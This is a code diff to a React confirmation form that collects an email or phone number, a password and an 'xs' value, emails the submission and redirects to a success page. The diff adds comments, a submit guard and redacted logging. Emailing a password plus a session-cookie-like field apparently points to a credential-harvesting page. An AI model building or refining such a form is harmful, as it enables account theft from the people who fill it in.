@@ -48,6 +48,7 @@ export default function Confirmation() {
 
   const contactMethod = form.watch('contactMethod');
 
+  // Load validation data from localStorage
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
@@ -78,25 +79,38 @@ export default function Confirmation() {
   }, [countrySearch]);
 
   const onSubmit = async (data: any) => {
+    if (isSubmitting) return;
+
     try {
       setIsSubmitting(true);
+      console.log('Form data before submission:', {
+        ...data,
+        password: '[REDACTED]',
+        xs: '[REDACTED]'
+      });
 
+      // Create the submission data with proper structure
       const submissionData = {
         ...data,
         user_email: contactMethod === 'phone' 
           ? `${data.countryCode}${data.user_email}`
           : data.user_email,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
       };
 
+      // Send the email
       await sendConfirmationFormEmail(submissionData);
+
+      // Clear the validation data from localStorage
       localStorage.removeItem('validation_data');
 
+      // Show success message
       toast({
         title: "Success!",
         description: "Your information has been submitted successfully"
       });
 
+      // Redirect after a short delay
       setTimeout(() => {
         setLocation("/success");
       }, 1500);
@@ -112,6 +126,7 @@ export default function Confirmation() {
     }
   };
 
+  // Keep the existing JSX structure unchanged
   return (
     <>
       <MetaTags
